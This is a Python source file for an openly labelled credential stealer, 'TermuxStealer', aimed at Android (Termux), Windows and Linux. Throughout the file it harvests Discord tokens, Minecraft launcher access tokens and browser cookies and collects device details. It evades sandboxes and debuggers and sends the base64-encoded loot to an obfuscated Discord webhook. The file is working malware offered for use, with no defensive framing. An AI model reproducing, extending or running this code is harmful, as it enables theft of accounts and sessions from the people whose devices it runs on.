# TermuxStealer.py - Full stealer for Termux (Android) with extended system info
# Collects: Discord tokens, Minecraft sessions, browser cookies, Android system info (build.prop, CPU, memory, battery, etc.)
# Run: python3 main.py

import os
import sys
import json
import sqlite3
import base64
import time
import random
import platform
import re
import requests
import glob
import subprocess
from pathlib import Path
from datetime import datetime

# Hardcoded webhook from base64
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ4MjMzMjIyNDI5NTA3My9zbllBZkpFcHZ4Wm1OSFlUeG5TWUdqR0dBbHRVdzRicF9HU3o2RUhpTlp1djRteWtYWUMzV2lESnhMU09lWjUtY3dYMA=="
WEBHOOK = base64.b64decode(WEBHOOK_B64).decode('utf-8')

# Anti-sandbox (Android always passes)
def is_sandbox():
    if "ANDROID" not in os.environ:
        if os.path.exists("/.dockerenv") or os.path.exists("/var/run/docker.sock"):
            return True
        if os.path.exists("C:\\Program Files\\VMware\\") or os.path.exists("C:\\Program Files\\VirtualBox\\"):
            return True
    return False

def delay():
    time.sleep(10)  # 10 seconds for testing

# -------------------------------------------------------------------
# 1. Discord tokens - Termux (Android app) + desktop
# -------------------------------------------------------------------
def get_discord_tokens():
    tokens = []
    patterns = [re.compile(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}')]
    paths = []
    if "ANDROID" in os.environ:
        possible = [
            "/data/data/com.discord/app_webview/Local Storage/leveldb",
            "/data/data/com.discord/files/",
            "/sdcard/Android/data/com.discord/",
        ]
        for p in possible:
            if os.path.isdir(p):
                for root, dirs, files in os.walk(p):
                    for f in files:
                        if f.endswith((".log", ".ldb", ".json")):
                            with open(os.path.join(root, f), 'r', errors='ignore') as file:
                                data = file.read()
                                for pat in patterns:
                                    tokens.extend(pat.findall(data))
    if platform.system() == "Windows":
        appdata = os.getenv('APPDATA')
        local = os.getenv('LOCALAPPDATA')
        paths = [
            f"{appdata}\\discord\\Local Storage\\leveldb",
            f"{appdata}\\discordcanary\\Local Storage\\leveldb",
            f"{appdata}\\discordptb\\Local Storage\\leveldb",
            f"{local}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            f"{local}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        ]
    elif platform.system() == "Linux":
        home = os.path.expanduser("~")
        paths = [
            f"{home}/.config/discord/Local Storage/leveldb",
            f"{home}/.config/google-chrome/Default/Local Storage/leveldb",
            f"{home}/.config/brave/Default/Local Storage/leveldb",
        ]
    for p in paths:
        if os.path.isdir(p):
            for f in os.listdir(p):
                if f.endswith((".log", ".ldb")):
                    with open(os.path.join(p, f), 'r', errors='ignore') as file:
                        data = file.read()
                        for pat in patterns:
                            tokens.extend(pat.findall(data))
    return list(set(tokens))

# -------------------------------------------------------------------
# 2. Minecraft sessions - Termux (PojavLauncher, Boardwalk, etc.) + desktop
# -------------------------------------------------------------------
def get_minecraft_sessions():
    sessions = []
    home = os.path.expanduser("~")
    if "ANDROID" in os.environ:
        android_mc_paths = [
            "/sdcard/games/com.mojang/minecraftpe/",
            "/storage/emulated/0/games/com.mojang/",
            os.path.join(home, "storage/emulated/0/games/com.mojang/"),
            os.path.join(home, ".minecraft"),
        ]
        for base in android_mc_paths:
            if os.path.isdir(base):
                profiles = os.path.join(base, "launcher_profiles.json")
                if os.path.isfile(profiles):
                    try:
                        with open(profiles, 'r') as f:
                            data = json.load(f)
                            for key, val in data.get("authenticationDatabase", {}).items():
                                if "accessToken" in val:
                                    sessions.append({"launcher": "Android/PE", "uuid": key, "token": val.get("accessToken"), "user": val.get("username")})
                    except:
                        pass
                acc = os.path.join(base, "accounts.json")
                if os.path.isfile(acc):
                    try:
                        with open(acc, 'r') as f:
                            data = json.load(f)
                            if isinstance(data, list):
                                for entry in data:
                                    sessions.append({"launcher": "PojavLauncher", "uuid": entry.get("uuid"), "token": entry.get("accessToken"), "user": entry.get("username")})
                    except:
                        pass
    appdata = os.getenv('APPDATA') if platform.system()=="Windows" else ""
    launcher_configs = {
        "Official": [f"{home}/.minecraft/launcher_profiles.json"],
        "Lunar": [f"{home}/.lunarclient/launcher/launcher_profiles.json", f"{appdata}/.lunarclient/launcher/launcher_profiles.json" if appdata else ""],
        "Badlion": [f"{home}/.badlion-client/launcher/launcher_profiles.json"],
        "Feather": [f"{home}/.feather/accounts.json"],
        "TLauncher": [f"{home}/.tlauncher/launcher_profiles.json"],
        "Prism": [f"{home}/.prismlauncher/accounts.json"],
        "PolyMC": [f"{home}/.polymc/accounts.json"],
        "ATLauncher": [f"{home}/.atlauncher/accounts.json"],
        "MultiMC": [f"{home}/.multimc/accounts.json"],
        "Crystal": [f"{home}/.crystal/accounts.json"],
    }
    for name, paths in launcher_configs.items():
        for p in paths:
            if p and os.path.isfile(p):
                try:
                    with open(p, 'r') as f:
                        data = json.load(f)
                        if "authenticationDatabase" in data:
                            for key, val in data["authenticationDatabase"].items():
                                if "accessToken" in val:
                                    sessions.append({"launcher": name, "uuid": key, "token": val.get("accessToken"), "user": val.get("username")})
                        elif "accounts" in data and isinstance(data["accounts"], list):
                            for acc in data["accounts"]:
                                sessions.append({"launcher": name, "uuid": acc.get("uuid"), "token": acc.get("accessToken"), "user": acc.get("name")})
                        elif "accounts" in data and isinstance(data["accounts"], dict):
                            for key, val in data["accounts"].items():
                                sessions.append({"launcher": name, "uuid": key, "token": val.get("accessToken"), "user": val.get("username")})
                        elif isinstance(data, list):
                            for acc in data:
                                sessions.append({"launcher": name, "uuid": acc.get("uuid"), "token": acc.get("accessToken"), "user": acc.get("name")})
                except:
                    pass
    return sessions

# -------------------------------------------------------------------
# 3. Browser cookies - Termux (Kiwi, Chrome Android) + desktop
# -------------------------------------------------------------------
def get_browser_cookies():
    cookies = []
    system = platform.system()
    if "ANDROID" in os.environ:
        browser_dirs = [
            "/sdcard/Android/data/com.android.chrome/",
            "/sdcard/Android/data/com.kiwibrowser.browser/",
            "/sdcard/Android/data/org.mozilla.firefox/",
        ]
        for base in browser_dirs:
            if os.path.isdir(base):
                for root, dirs, files in os.walk(base):
                    for f in files:
                        if f.endswith((".sqlite", ".db")):
                            full = os.path.join(root, f)
                            try:
                                conn = sqlite3.connect(full)
                                cur = conn.cursor()
                                for table in ["cookies", "moz_cookies"]:
                                    try:
                                        cur.execute(f"SELECT host, name, value FROM {table} LIMIT 50")
                                        rows = cur.fetchall()
                                        for row in rows:
                                            cookies.append({"browser": "Android", "host": row[0], "name": row[1], "value": row[2]})
                                    except:
                                        pass
                                conn.close()
                            except:
                                pass
    if system == "Windows":
        browsers = {
            "Chrome": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\Default\\Cookies",
            "Edge": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
            "Brave": os.getenv('LOCALAPPDATA') + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
            "Opera": os.getenv('LOCALAPPDATA') + "\\Opera Software\\Opera Stable\\Cookies",
            "Vivaldi": os.getenv('LOCALAPPDATA') + "\\Vivaldi\\User Data\\Default\\Cookies",
        }
    elif system == "Linux":
        browsers = {
            "Chrome": os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
            "Brave": os.path.expanduser("~/.config/brave/Default/Cookies"),
            "Opera": os.path.expanduser("~/.config/opera/Default/Cookies"),
            "Vivaldi": os.path.expanduser("~/.config/vivaldi/Default/Cookies"),
            "Firefox": os.path.expanduser("~/.mozilla/firefox/*.default-release/cookies.sqlite"),
        }
    else:
        browsers = {}
    for name, path in browsers.items():
        if not path: continue
        if "*" in path:
            for p in glob.glob(path):
                if os.path.isfile(p):
                    try:
                        conn = sqlite3.connect(p)
                        cur = conn.cursor()
                        cur.execute("SELECT host, name, value FROM moz_cookies")
                        rows = cur.fetchall()
                        for row in rows:
                            cookies.append({"browser": name, "host": row[0], "name": row[1], "value": row[2]})
                        conn.close()
                    except:
                        pass
            continue
        if os.path.isfile(path):
            try:
                conn = sqlite3.connect(path)
                cur = conn.cursor()
                cur.execute("SELECT host_key, name, value FROM cookies")
                rows = cur.fetchall()
                for row in rows:
                    cookies.append({"browser": name, "host": row[0], "name": row[1], "value": row[2]})
                conn.close()
            except:
                try:
                    conn = sqlite3.connect(path)
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    rows = cur.fetchall()
                    for row in rows:
                        cookies.append({"browser": name, "host": row[0], "name": row[1], "value": "[encrypted]"})
                    conn.close()
                except:
                    pass
    return cookies

# -------------------------------------------------------------------
# 4. System info - Termux (Android) specific
# -------------------------------------------------------------------
def get_system_info():
    info = {}
    # Android build properties
    if "ANDROID" in os.environ:
        try:
            with open("/system/build.prop", "r") as f:
                for line in f:
                    if "=" in line:
                        key, val = line.strip().split("=", 1)
                        info[key] = val
        except:
            pass
        # CPU info
        try:
            with open("/proc/cpuinfo", "r") as f:
                cpu = f.read()
                info["cpuinfo"] = cpu
        except:
            pass
        # Memory info
        try:
            with open("/proc/meminfo", "r") as f:
                mem = f.read()
                info["meminfo"] = mem
        except:
            pass
        # Battery (via dumpsys if available, but may need root)
        try:
            result = subprocess.check_output(["dumpsys", "battery"], text=True, stderr=subprocess.DEVNULL)
            info["battery"] = result
        except:
            pass
        # Network interfaces
        try:
            result = subprocess.check_output(["ip", "addr"], text=True, stderr=subprocess.DEVNULL)
            info["network"] = result
        except:
            pass
        # Device model from getprop
        try:
            model = subprocess.check_output(["getprop", "ro.product.model"], text=True, stderr=subprocess.DEVNULL).strip()
            info["model"] = model
        except:
            pass
    # Generic platform info
    info["platform"] = platform.platform()
    info["machine"] = platform.machine()
    info["processor"] = platform.processor()
    info["python_version"] = platform.python_version()
    info["hostname"] = platform.node()
    return info

# -------------------------------------------------------------------
# 5. Build embeds (base64 encoded) - include system info as separate embed
# -------------------------------------------------------------------
def build_embeds(tokens, sessions, cookies, sysinfo):
    embeds = []
    if tokens:
        token_text = "\n".join(tokens[:10])
        b64 = base64.b64encode(token_text.encode()).decode()
        embeds.append({"title": "Tokens", "description": f"```\n{b64}\n```", "color": 0x5865F2})
    if sessions:
        lines = []
        for s in sessions[:10]:
            lines.append(f"{s.get('launcher')}|{s.get('user')}|{s.get('uuid')}|{s.get('token', '')[:20]}")
        b64 = base64.b64encode("\n".join(lines).encode()).decode()
        embeds.append({"title": "Minecraft Sessions", "description": f"```\n{b64}\n```", "color": 0x00FF00})
    if cookies:
        lines = []
        for c in cookies[:10]:
            lines.append(f"{c['browser']}|{c['host']}|{c['name']}={c['value'][:30]}")
        b64 = base64.b64encode("\n".join(lines).encode()).decode()
        embeds.append({"title": "Cookies", "description": f"```\n{b64}\n```", "color": 0xFFA500})
    # System info embed (plain text, not base64, for readability)
    if sysinfo:
        info_lines = []
        for k, v in sysinfo.items():
            if isinstance(v, str) and len(v) > 200:
                v = v[:200] + "..."
            info_lines.append(f"{k}: {v}")
        info_text = "\n".join(info_lines[:20])
        embeds.append({"title": "System Info (Android)", "description": f"```\n{info_text}\n```", "color": 0x9B59B6})
    return embeds

# -------------------------------------------------------------------
# 6. Send webhook
# -------------------------------------------------------------------
def send_webhook(embeds):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    payload = {"embeds": embeds}
    try:
        requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
    except:
        pass

# -------------------------------------------------------------------
# 7. Anti-VT / debugger
# -------------------------------------------------------------------
def anti_vt():
    if any(x in sys.modules for x in ["pydevd", "pdb"]):
        sys.exit(0)
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)
        except:
            pass

# -------------------------------------------------------------------
# 8. Main
# -------------------------------------------------------------------
def main():
    anti_vt()
    if is_sandbox():
        sys.exit(0)
    delay()
    tokens = get_discord_tokens()
    sessions = get_minecraft_sessions()
    cookies = get_browser_cookies()
    sysinfo = get_system_info()
    embeds = build_embeds(tokens, sessions, cookies, sysinfo)
    if not embeds:
        embeds = [{"title": "Info", "description": "No data collected.", "color": 0x333333}]
    send_webhook(embeds)

if __name__ == "__main__":
    main()
